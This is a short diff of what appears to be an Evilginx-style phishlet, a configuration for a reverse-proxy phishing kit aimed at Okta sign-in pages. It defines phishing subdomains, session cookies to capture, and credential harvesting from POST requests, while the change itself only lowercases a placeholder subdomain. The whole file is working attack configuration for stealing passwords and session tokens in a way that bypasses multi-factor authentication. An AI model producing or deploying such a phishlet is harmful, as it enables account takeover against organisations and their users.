@@ -3,7 +3,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false }
-  - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true}
+  - {phish_sub: 'example', orig_sub: 'example', domain: 'okta.com', session: true, is_landing: true}
 sub_filters: []
 auth_tokens:
   - domain: 'EXAMPLE.okta.com'
@@ -18,5 +18,5 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'EXAMPLE.okta.com'
+  domain: 'example.okta.com'
   path: '/login/login.htm'
